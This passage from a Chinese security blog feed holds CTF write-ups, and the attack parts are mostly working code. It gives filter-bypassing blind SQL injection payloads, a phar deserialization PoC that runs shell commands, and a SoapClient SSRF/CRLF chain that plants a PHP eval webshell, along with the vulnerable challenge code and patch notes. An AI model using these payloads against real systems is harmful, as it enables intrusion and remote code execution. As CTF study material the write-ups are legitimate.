class="line">mysql&gt; select version();</div><div class="line">+-------------------------+</div><div class="line">| version()               |</div><div class="line">+-------------------------+</div><div class="line">| 5.7.32-0ubuntu0.16.04.1 |</div><div class="line">+-------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select ascii(version());</div><div class="line">+------------------+</div><div class="line">| ascii(version()) |</div><div class="line">+------------------+</div><div class="line">|               53 |</div><div class="line">+------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select ascii(version()) between 1 and 52;</div><div class="line">+-----------------------------------+</div><div class="line">| ascii(version()) between 1 and 52 |</div><div class="line">+-----------------------------------+</div><div class="line">|                                 0 |</div><div class="line">+-----------------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select ascii(version()) between 1 and 53;</div><div class="line">+-----------------------------------+</div><div class="line">| ascii(version()) between 1 and 53 |</div><div class="line">+-----------------------------------+</div><div class="line">|                                 1 |</div><div class="line">+-----------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><p>突破第二点：</p><p>因为ascii只能获取到第一个字符的ascii码，而且这里过滤了大部分常见的<code>substr、mid</code>字符串截取函数，并且过滤了一些特殊字符，导致情况变的有些困难</p><p>1、如果要使用<code>trim</code>去进行判断的话，需要用到leading和trailing，但是这里过滤了in</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">trim(leading &apos;s1&apos; from &apos;s2&apos;) 从左边截取，删除字符串s2当中的字符串s1</div><div class="line">trim(trailing &apos;s1&apos; from &apos;s2&apos;) 从右边截取，删除字符串s2当中的字符串s1</div><div class="line">mysql&gt; select ascii(trim(version()));</div><div class="line">+------------------------+</div><div class="line">| ascii(trim(version())) |</div><div class="line">+------------------------+</div><div class="line">|                     53 |</div><div class="line">+------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select trim(leading &apos;5&apos; from version());</div><div class="line">+----------------------------------+</div><div class="line">| trim(leading &apos;5&apos; from version()) |</div><div class="line">+----------------------------------+</div><div class="line">| .7.32-0ubuntu0.16.04.1           |</div><div class="line">+----------------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select ascii(trim(leading &apos;5&apos; from version()));</div><div class="line">+-----------------------------------------+</div><div class="line">| ascii(trim(leading &apos;5&apos; from version())) |</div><div class="line">+-----------------------------------------+</div><div class="line">|                                      46 |</div><div class="line">+-----------------------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select trim(leading &apos;5.&apos; from version());</div><div class="line">+-----------------------------------+</div><div class="line">| trim(leading &apos;5.&apos; from version()) |</div><div class="line">+-----------------------------------+</div><div class="line">| 7.32-0ubuntu0.16.04.1             |</div><div class="line">+-----------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><p>2、过滤了right，导致下面方法不能用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select version();</div><div class="line">+-------------------------+</div><div class="line">| version()               |</div><div class="line">+-------------------------+</div><div class="line">| 5.7.32-0ubuntu0.16.04.1 |</div><div class="line">+-------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select right(left(version(),2),1);</div><div class="line">+----------------------------+</div><div class="line">| right(left(version(),2),1) |</div><div class="line">+----------------------------+</div><div class="line">| .                          |</div><div class="line">+----------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select right(left(version(),3),1);</div><div class="line">+----------------------------+</div><div class="line">| right(left(version(),3),1) |</div><div class="line">+----------------------------+</div><div class="line">| 7                          |</div><div class="line">+----------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><p>绕过方法：</p><p>1、可以使用replace，猜测出第一个字符后，把该字符替换为空，这样依次处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select replace(version(),&apos;5.&apos;,&apos;&apos;);</div><div class="line">+----------------------------+</div><div class="line">| replace(version(),&apos;5.&apos;,&apos;&apos;) |</div><div class="line">+----------------------------+</div><div class="line">| 7.32-0ubuntu0.16.04.1      |</div><div class="line">+----------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select replace(version(),&apos;5.7&apos;,&apos;&apos;);</div><div class="line">+-----------------------------+</div><div class="line">| replace(version(),&apos;5.7&apos;,&apos;&apos;) |</div><div class="line">+-----------------------------+</div><div class="line">| .32-0ubuntu0.16.04.1        |</div><div class="line">+-----------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><p>方法缺陷：<br>加入flag数据如：flag{123123},当判断到第3个字符后，第四次判断是<code>replace</code>把123变成空，导致不能正常判断了</p><p>方法改进：使用<code>replace+left</code>组合的方式（这种方法也有一些小的缺陷，如果刚好第一个字符和第二个字符一样，那么使用left依旧不能解决这种问题，不过只要遇到了这个缺陷，那么在知道内容长度的情况下，就可以判断出第二个字符了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select replace(&apos;123123&apos;,&apos;123&apos;,&apos;&apos;);</div><div class="line">+----------------------------+</div><div class="line">| replace(&apos;123123&apos;,&apos;123&apos;,&apos;&apos;) |</div><div class="line">+----------------------------+</div><div class="line">|                            |</div><div class="line">+----------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select replace(left(&apos;123123&apos;,4),&apos;123&apos;,&apos;&apos;);</div><div class="line">+------------------------------------+</div><div class="line">| replace(left(&apos;123123&apos;,4),&apos;123&apos;,&apos;&apos;) |</div><div class="line">+------------------------------------+</div><div class="line">| 1                                  |</div><div class="line">+------------------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select replace(left(&apos;123123&apos;,5),&apos;1231&apos;,&apos;&apos;);</div><div class="line">+-------------------------------------+</div><div class="line">| replace(left(&apos;123123&apos;,5),&apos;1231&apos;,&apos;&apos;) |</div><div class="line">+-------------------------------------+</div><div class="line">| 2                                   |</div><div class="line">+-------------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><p>最终构造：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;UNION/**/SELECT/**/1,if((select/**/cast(((select/**/ascii(replace(left(group_concat(table_name),7),&apos;users,&apos;,&apos;&apos;))/**/from/**/sys.schema_table_statistics)/83)/**/as/**/char(1))),benchmark(10000000,md5(1)),1),&apos;111&apos;%23&amp;password=1</div></pre></td></tr></table></figure><p>-&gt;延时</p><p>判断出users,的下一个表名第一个字符ascii码为70,为大写的F</p><p><img src="http://pic.c1imber.top/blog/20210115/qpCjBRQo1pYB.png?imageslim" alt="mark"></p><p>后来问了做出这道题的学长，表名其实应该是（SeCrrreT），当时看ascii码是70就延时了，就没往后试了，以为是F</p><p>绕过方法2：使用mysql字符串反转函数<code>reverse</code>（由于比赛的时候不能上网，记不起来这个函数名了，所以没有去试该函数是否被过滤了，这里说一下方法）</p><p>使用<code>left+reverse</code>组合进行绕过，用法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select version();</div><div class="line">+-------------------------+</div><div class="line">| version()               |</div><div class="line">+-------------------------+</div><div class="line">| 5.7.32-0ubuntu0.16.04.1 |</div><div class="line">+-------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select reverse(left(version(),2));</div><div class="line">+----------------------------+</div><div class="line">| reverse(left(version(),2)) |</div><div class="line">+----------------------------+</div><div class="line">| .5                         |</div><div class="line">+----------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select ascii(reverse(left(version(),2)));</div><div class="line">+-----------------------------------+</div><div class="line">| ascii(reverse(left(version(),2))) |</div><div class="line">+-----------------------------------+</div><div class="line">|                                46 |</div><div class="line">+-----------------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select reverse(left(version(),3));</div><div class="line">+----------------------------+</div><div class="line">| reverse(left(version(),3)) |</div><div class="line">+----------------------------+</div><div class="line">| 7.5                        |</div><div class="line">+----------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select ascii(reverse(left(version(),3)));</div><div class="line">+-----------------------------------+</div><div class="line">| ascii(reverse(left(version(),3))) |</div><div class="line">+-----------------------------------+</div><div class="line">|                                55 |</div><div class="line">+-----------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><p>绕过方法3：<br>赛后和同事交流后发现依旧可以使用<code>trim</code>，用法：<br><code>trim(both &#39;s1&#39; from &#39;s2&#39;)</code> 删除字符串s2两边的s1</p><p>只要是字符串删除的方法，均会遇到上面所说的像replace那样的问题，使用<code>left</code>就能解决</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select trim(both &apos;123&apos; from &apos;123123&apos;);</div><div class="line">+--------------------------------+</div><div class="line">| trim(both &apos;123&apos; from &apos;123123&apos;) |</div><div class="line">+--------------------------------+</div><div class="line">|                                |</div><div class="line">+--------------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select trim(both &apos;123&apos; from left(&apos;123123&apos;,4));</div><div class="line">+----------------------------------------+</div><div class="line">| trim(both &apos;123&apos; from left(&apos;123123&apos;,4)) |</div><div class="line">+----------------------------------------+</div><div class="line">| 1                                      |</div><div class="line">+----------------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><p>其实也可以不用盲注</p><p>知道了系统的用户名为root</p><p>按照上面的方法构造：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;/**/and/**/true%23&amp;password=</div></pre></td></tr></table></figure><p>-&gt;响应中存在welcome Admin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;/**/and/**/false%23&amp;password=</div></pre></td></tr></table></figure><p>-&gt;响应中不存在welcome Admin</p><p>使用布尔盲注代替时间盲注即可</p><p>比赛时这道题最终还是没有做出来，赛后根据这道题目做了个docker环境，题目代码逻辑和过滤关键字如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span>((preg_match(<span class="string">"/sleep|update|extract|in|substr|mid|right|like|regexp|&lt;|=|&gt;|\^|\"|or/i"</span>, $_POST[<span class="string">'username'</span>])) || preg_match(<span class="string">"/sleep|update|extract|in|substr|mid|right|like|regexp|&lt;|=|&gt;|\^|\"|or/i"</span>, $_POST[<span class="string">'password'</span>]))</div><div class="line">    &#123;</div><div class="line">         <span class="keyword">die</span>(<span class="string">"hacker!!!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        $conn=mysqli_connect($dbhost,$dbuser,$dbpasswd,$dbname);</div><div class="line">        $sql=<span class="string">"select * from users where username='"</span>.$_POST[<span class="string">'username'</span>].<span class="string">"' and password='"</span>.$_POST[<span class="string">'password'</span>].<span class="string">"'"</span>;</div><div class="line">        <span class="keyword">echo</span> $sql.<span class="string">"\n\n"</span>;</div><div class="line">        <span class="keyword">if</span>(($result=mysqli_query($conn,$sql)) &amp;&amp; (mysqli_num_rows($result)&gt;<span class="number">0</span>))</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"&lt;h1 color='red'&gt;Welcome,Admin!&lt;/h1&gt;"</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Login Error"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>根据上面的绕过方法编写脚本</p><p><img src="http://pic.c1imber.top/blog/20210115/JbC8fLgNRN4R.png?imageslim" alt="mark"></p><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><p><strong>hackshark</strong></p><p>在过滤器当中输入：<code>http.request.method==POST</code></p><p>过滤出http POST流量，分析http流量，发现为sql布尔盲注流量，猜测盲注的password字段就是flag</p><p>当判断为真时，响应当中会有<code>&lt;img src=&quot;../images/slap.jpg&quot;</code>的内容</p><p><img src="http://pic.c1imber.top/blog/20210115/ikcSG2xMkgNl.png?imageslim" alt="mark"></p><p>根据响应过滤出相应的内容<br><code>http contains &quot;/images/slap.jpg&quot;</code></p><p><img src="http://pic.c1imber.top/blog/20210115/5OifB4TGm6rD.png?imageslim" alt="mark"></p><p>追踪http流，获取flag</p><p>flag{booool_sqli}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h3&gt;&lt;p&gt;12月份参加的线下赛，补一下，个人赛成绩不怎么好，在这记录一下&lt;/p&gt;
&lt;h3 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;hea
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎杯总决赛web题</title>
    <link href="https://c1aysec.github.io/2020/12/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9Bweb%E9%A2%98/"/>
    <id>https://c1aysec.github.io/2020/12/14/2020网鼎杯总决赛web题/</id>
    <published>2020-12-13T16:36:23.152Z</published>
    <updated>2021-01-15T06:48:20.993Z</updated>
    
    <content type="html"><![CDATA[<h3 id="game-exp"><a href="#game-exp" class="headerlink" title="game_exp"></a>game_exp</h3><p>漏洞一：phar反序列化</p><p>regiter.php当中第3行-第9行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</div><div class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "ok";'</span>;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><code>AnyClass</code>类的<code>__destruct</code>存在反序列化，而第31行<code>file_exists</code>函数刚好可以触发phar反序列化</p><p><img src="http://pic.c1imber.top/blog/20201214/RS1sRe71nndP.png?imageslim" alt="mark"></p><p>poc构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;output=<span class="string">"system('ls /');"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"poc.phar"</span>);</div><div class="line">$phar-&gt;startBuffering();</div><div class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</div><div class="line">$a=<span class="keyword">new</span> AnyClass();</div><div class="line">$phar-&gt;setMetadata($a);</div><div class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</div><div class="line">$phar-&gt;stopBuffering();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>在注册的时候上传图片，图片内容为上面poc生成的phar文件</p><p><img src="http://pic.c1imber.top/blog/20201214/lWwmo4BQi326.png?imageslim" alt="mark"></p><p>之后通过phar://协议触发反序列化，执行命令</p><p><img src="http://pic.c1imber.top/blog/20201214/HMByfAS16VcK.png?imageslim" alt="mark"></p><p>漏洞二：</p><p>finger/index.php：第4行-第23行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</div><div class="line"><span class="keyword">if</span> ($ip == <span class="string">"127.0.0.1"</span>) &#123;</div><div class="line">    <span class="keyword">include_once</span> <span class="string">"../sqlhelper.php"</span>;</div><div class="line">    $uid = addslashes($_SESSION[<span class="string">'uid'</span>]);</div><div class="line">    $mysql = <span class="keyword">new</span> sqlhelper();</div><div class="line">    $sql = <span class="string">"SELECT id FROM goder where uid = '$uid'"</span>;</div><div class="line">    $res = $mysql-&gt;execute_dml($sql);</div><div class="line">    <span class="keyword">if</span> ($res) &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'cmd'</span>])) &#123;</div><div class="line">            system($_POST[<span class="string">'cmd'</span>]);</div><div class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('启动金手指模式!');&lt;/script&gt;"</span>;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('你还不是王者!');&lt;/script&gt;"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('只有本地的王者才能访问!');&lt;/script&gt;"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>可以看到存在命令执行，但是<code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>不能为127.0.0.1，这里当时不知道该怎么绕</p><p><strong>patch：</strong></p><p>regiter.php：把<code>AnyClass</code>类那段代码注释掉</p><p>finger/index.php：虽然绕不过去，但是通过漏洞一已经可以拿到flag了，这里只需要防御就行了，防御很简单，注释掉<code>system($_POST[&#39;cmd&#39;])</code>这段代码就行</p><p>game_exp赛后补充：</p><p>漏洞二：另一处phar反序列化pop链</p><p>全局搜索<code>__destruct</code>，在user.php第40行-第44行</p><p><img src="http://pic.c1imber.top/blog/20201214/TzAaDYn8Oumw.png?imageslim" alt="mark"></p><p>这里的<code>__destruct</code>将<code>user</code>类的<code>goder_text</code>成员变量进行了反序列化，然后调用了反序列化后对象的<code>recordOrNot</code>方法，这里可以把成员变量<code>goder_text</code>设置为php的内置类<code>SoapClient</code>，由于<code>SoapClient</code>类当中不存在<code>recordOrNot</code>方法，就会触发<code>SoapClient</code>类的<code>__call</code>方法，可以发起post请求，再结合CRLF就可以构造任意post请求，注意这里的soapclient触发的ssrf是没有回显的，所以需要通过写入webshell的方式</p><p>poc构造：</p><p>利用链：</p><p>register.php phar反序列化-&gt;利用<code>User</code>类<code>__destruct</code>代码，通过<code>SoapClient</code>内置类触发SSRF-&gt;结合CLRF构造任意POST请求</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$target = <span class="string">'http://127.0.0.1/finger/index.php'</span>;</div><div class="line">$headers = <span class="keyword">array</span>(</div><div class="line">    <span class="string">'Cookie: PHPSESSID=ie0il2me6irbvcqj1jebr67fu0'</span></div><div class="line">    );</div><div class="line">$post_string = <span class="string">'cmd=echo "&lt;?php @eval(\$_GET[1]);?&gt;" &gt; shell.php'</span>;</div><div class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>=&gt;<span class="string">"aaab"</span>));</div><div class="line">$aaa = serialize($b);</div><div class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">"\r\n"</span>,$aaa);</div><div class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;'</span>,$aaa);</div><div class="line"><span class="keyword">echo</span> $aaa;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($aaa=<span class="string">""</span>)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;goder_text=$aaa;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"poc.phar"</span>);</div><div class="line">$phar-&gt;startBuffering();</div><div class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</div><div class="line">$a=<span class="keyword">new</span> User($aaa);</div><div class="line">$phar-&gt;setMetadata($a);</div><div class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</div><div class="line">$phar-&gt;stopBuffering();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>注意这里需要在http header当中设置一个登录后的session id，因为这里访问本地的时候做了登录检查，如下：</p><p>finger/index.php第二行，包含了login_requre.php</p><p><img src="http://pic.c1imber.top/blog/20201214/4DMxdA3zqWII.png?imageslim" alt="mark"></p><p>login_requre.php当中进行了session登录认证</p><p><img src="http://pic.c1imber.top/blog/20201214/1pbCm0Ba8ImV.png?imageslim" alt="mark"></p><p>场景复现</p><p>用docker在本地搭一个和比赛一样的镜像，需要安装php-soap扩展</p><p><img src="http://pic.c1imber.top/blog/20201214/PTbdEGMuiuot.png?imageslim" alt="mark"></p><p>注册上传图片，图片内容改成上面poc生成的phar文件</p><p><img src="http://pic.c1imber.top/blog/20201214/mCsUf5R3zLFk.png?imageslim" alt="mark"></p><p>登录账号，给poc当中的sessionid授权</p><p><img src="http://pic.c1imber.top/blog/20201214/dU9phcbNO9MH.png?imageslim" alt="mark"></p><p>phar触发反序列化，写入webshell</p><p><img src="http://pic.c1imber.top/blog/20201214/BYl7NpID5H0u.png?imageslim" alt="mark"></p><p>成功写入：</p><p><img src="http://pic.c1imber.top/blog/20201214/oRLsOwDHGCKu.png?imageslim" alt="mark"></p><h3 id="novel"><a href="#novel" class="headerlink" title="novel"></a>novel</h3><p>漏洞：备份功能代码处理不当而导致的任意代码执行</p><p>class/back.class.php 第19行-第28行：<code>backup</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backup</span><span class="params">($filename, $dest)</span></span>&#123;</div><div class="line">   $filename=<span class="string">'profile/'</span>.$filename;</div><div class="line">   <span class="keyword">if</span>(file_exists($filename))&#123;</div><div class="line">      $content=htmlspecialchars(file_get_contents($filename),ENT_QUOTES);</div><div class="line">      $password=<span class="keyword">$this</span>-&gt;random_code();</div><div class="line">      $r[<span class="string">'path'</span>]=<span class="keyword">$this</span>-&gt;_write($dest, <span class="keyword">$this</span>-&gt;_create($password, $content));</div><div class="line">      $r[<span class="string">'password'</span>]=$password;</div><div class="line">      <span class="keyword">echo</span> json_encode($r);</div><div class="line">   &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* 先验证保证为备份文件后,再保存为私藏文件 */</span></div><div class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_write</span><span class="params">($dest, $content)</span></span>&#123;</div><div class="line">   $f1=$dest;</div><div class="line">   